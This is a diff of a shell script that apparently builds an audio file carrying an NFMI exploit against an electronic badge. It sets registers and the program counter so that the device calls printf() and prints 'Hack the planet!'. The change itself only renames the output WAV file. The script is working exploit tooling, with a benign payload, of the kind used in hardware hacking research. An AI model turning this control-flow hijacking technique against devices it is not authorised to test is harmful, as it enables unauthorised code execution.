@@ -7,7 +7,7 @@ CR=$'\x0D'   # this works with "write_signal.py -a" but all attempts to me vars 
 echo -e Creating B20 # length 21: "B" then twenty (0x14) zeros (we can only control 11 data bytes per packet, anything longer than that is filled in with a 0 by the hacked NFMI firmware)
 python write_signal.py -q 0 0 0 0  15  42 0 0 0  0 0 0 0  0 0 0
 ./craft_multipart_attack.sh
-sox synthetic_signal.wav recordings/silence_1000ms.wav synthetic_print_seth.wav
+sox synthetic_signal.wav recordings/silence_1000ms.wav synthetic_hack_the_planet_for_print_recv.wav
 
 
 echo -e R4 R5 R6 
@@ -15,8 +15,8 @@ echo -e R4 R5 R6
 # R5 and R6 are unused
 python write_signal.py -q 0 0 0 0  C  B0 2F 00 20  00 00 00 00  00 00 00
 ./craft_multipart_attack.sh
-sox synthetic_print_seth.wav synthetic_signal.wav recordings/silence_1000ms.wav temp/out.wav #concat with delay
-mv temp/out.wav synthetic_print_seth.wav
+sox synthetic_hack_the_planet_for_print_recv.wav synthetic_signal.wav recordings/silence_1000ms.wav temp/out.wav #concat with delay
+mv temp/out.wav synthetic_hack_the_planet_for_print_recv.wav
 
 
 echo -e PC R4_2 PC_2
@@ -24,15 +24,15 @@ echo -e PC R4_2 PC_2
 #PC_2 = 42d -> printf()
 python write_signal.py -q 0 0 0 0  C  4f 2E 00 00  00 00 00 00  2D 04 00
 ./craft_multipart_attack.sh
-sox synthetic_print_seth.wav synthetic_signal.wav recordings/silence_1000ms.wav temp/out.wav #concat with delay
-mv temp/out.wav synthetic_print_seth.wav
+sox synthetic_hack_the_planet_for_print_recv.wav synthetic_signal.wav recordings/silence_1000ms.wav temp/out.wav #concat with delay
+mv temp/out.wav synthetic_hack_the_planet_for_print_recv.wav
 
 
 echo -e '"Hack the pl"'
 python write_signal.py -q -a  0 0 0 0  b  H a c k ' ' t h e ' ' p l
 ./craft_multipart_attack.sh
-sox synthetic_print_seth.wav synthetic_signal.wav recordings/silence_1000ms.wav temp/out.wav #concat with delay
-mv temp/out.wav synthetic_print_seth.wav
+sox synthetic_hack_the_planet_for_print_recv.wav synthetic_signal.wav recordings/silence_1000ms.wav temp/out.wav #concat with delay
+mv temp/out.wav synthetic_hack_the_planet_for_print_recv.wav
 
 
 echo -e '"anet!\\d\\a\\0EBE"'
@@ -40,8 +40,8 @@ echo -e '"anet!\\d\\a\\0EBE"'
 # Maybe extra B E will help the badge get unstuck?
 python write_signal.py -q  0 0 0 0  b  61 6e 65 74 21 0d 0a 00 45 42 45
 ./craft_multipart_attack.sh
-sox synthetic_print_seth.wav synthetic_signal.wav recordings/silence_2281ms.wav temp/out.wav #concat with delay
-mv temp/out.wav synthetic_print_seth.wav
+sox synthetic_hack_the_planet_for_print_recv.wav synthetic_signal.wav recordings/silence_2281ms.wav temp/out.wav #concat with delay
+mv temp/out.wav synthetic_hack_the_planet_for_print_recv.wav
 
 
 
